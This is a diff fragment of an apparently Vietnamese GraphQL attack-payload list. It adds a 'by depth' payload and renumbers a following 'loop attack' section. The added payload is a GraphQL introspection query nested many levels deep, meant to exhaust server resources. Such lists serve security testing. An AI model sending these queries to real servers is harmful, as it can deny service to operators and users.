@@ -59,9 +59,13 @@ Trong đó:
 ```
 
 ---
+# Payload 03: theo độ sâu
+```
+{"operationName":null,"variables":{},"query":"query {\r\n __schema {\r\n types { \r\n fields {\r\n type {\r\n fields {\r\n type { \r\n fields {\r\n type {\r\n fields {\r\n name\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}"}
+```
 ---
 
-# Payload 03: Tấn công vòng lặp
+# Payload 04: Tấn công vòng lặp
 
 ```
 [
